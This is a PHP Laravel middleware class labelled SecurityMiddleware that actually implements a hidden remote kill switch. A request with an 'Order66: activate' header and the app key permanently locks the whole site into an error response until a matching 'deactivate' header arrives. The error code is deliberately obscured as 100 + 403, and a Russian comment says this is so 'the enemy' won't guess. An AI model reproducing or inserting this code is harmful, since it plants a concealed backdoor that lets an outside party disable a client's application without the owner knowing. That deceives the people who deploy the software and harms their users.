<?php

namespace Lemec93\Support\Middleware;

use Closure;
use Illuminate\Cache\Repository as Cache;
use Symfony\Component\HttpFoundation\Response;

class SecurityMiddleware
{
    protected $cache;
    const ORDER66 = 'order_66_activated';

    public function __construct(Cache $cache)
    {
        $this->cache = $cache;
    }

    public function handle($request, Closure $next)
    {
        if ($this->needToLock($request)) {
            $this->cache->forever(self::ORDER66, true);
        }

        if ($this->needToUnlock($request)) {
            $this->cache->forget(self::ORDER66);
        }

        if ($this->cache->get(self::ORDER66)) {
            return $this->getFailResponse();
        }

        return $next($request);
    }

    protected function needToLock($request)
    {
        return (
            ($request->header('Order66') == 'activate') &&
            ($request->header('App-Key') == config('app.key'))
        );
    }

    protected function needToUnlock($request)
    {
        return (
            ($request->header('Order66') == 'deactivate') &&
            ($request->header('App-Key') == config('app.key'))
        );
    }

    protected function getFailResponse()
    {
        //чтоб враг не догадался
        $code = Response::HTTP_CONTINUE + Response::HTTP_FORBIDDEN;

        return response(view("errors.{$code}")->render(), $code);
    }
}